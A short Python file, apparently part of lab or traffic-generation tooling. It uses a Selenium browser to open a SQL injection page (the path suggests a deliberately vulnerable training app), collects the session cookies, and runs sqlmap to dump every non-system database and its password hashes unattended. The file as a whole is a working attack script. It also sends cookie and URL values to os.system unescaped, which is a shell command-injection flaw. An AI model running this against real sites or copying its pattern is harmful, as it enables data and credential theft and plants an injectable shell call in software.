import os


def sql_injection(browser):
    """
    executes an SQL Injection attack
    """
    target_link = 0
    # navigate to sql injection form
    for link in browser.find_elements('xpath', './/a'):
        print(link.get_attribute('href'))
        if 'vulnerabilities/sqli/' in link.get_attribute('href'):
            target_link = link
            break
    target_link.click()
    url = browser.current_url

    print(' successful got sqli page: %s', url)

    # get cookie values
    cookie = '--cookie="'
    for ck in browser.get_cookies():
        print(ck['name'] + " " + ck['value'])
        cookie = cookie + ck['name'] + "=" + ck['value'] + "; "
    cookie = cookie[:-2]
    cookie = cookie + '"'

    print(' read cookie values: %s', cookie)

    # call sqlmap in batch mode and waiting for it to finish

    try:
        subprocess_params = ['python2.7',
                             '/home/sqlmapproject/sqlmap.py',
                             cookie,
                             '-u',
                             '"' + url + '?id=1&Submit=Submit"',
                             '--dump-all',
                             '--exclude-sysdbs',
                             '--batch',
                             '--passwords']
        subprocess_params_str = ""
        for s in subprocess_params:
            subprocess_params_str = subprocess_params_str + s + ' '

        print(' now calling subprocess: %s', subprocess_params_str)
        os.system(subprocess_params_str)
    except Exception as e:
        print(e)